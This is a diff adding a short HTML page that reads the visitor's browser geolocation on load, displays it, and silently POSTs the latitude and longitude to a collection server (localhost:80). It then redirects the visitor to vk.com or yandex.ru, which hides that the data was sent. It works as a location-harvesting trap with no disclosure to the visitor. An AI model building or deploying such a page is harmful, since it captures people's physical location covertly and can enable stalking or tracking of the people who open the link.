@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Oh, your location</title>
+	<script src="jquery.js"></script>
+</head>
+<style>
+	.loc{
+		font-size: 24px;
+		font-family: Arial;
+		margin:0 auto;
+		padding: 0;
+		width:150px;
+	}
+</style>
+<body>
+	<div id="wrapper">
+		<center>
+			<div id="location">
+				<span  class="loc">Latitude:</span><span id="lat"></span>
+				<br/>
+				<span  class="loc">Longitude:</span><span id="log"></span>
+			</div>
+		</center>
+	</div>
+</body>
+<script>
+	function geolocation(pos){
+		document.getElementById('lat').innerText=pos.coords.latitude;
+		document.getElementById('log').innerText=pos.coords.longitude;
+		$.post('http://localhost:80',data={lat:pos.coords.latitude,log:pos.coords.longitude}).done(function(){
+			document.location.href='https://vk.com';
+		}).fail(function(){
+			document.location.href='https://yandex.ru';
+		});
+	}
+	window.onload = navigator.geolocation.getCurrentPosition(geolocation);
+
+</script>
+</html>
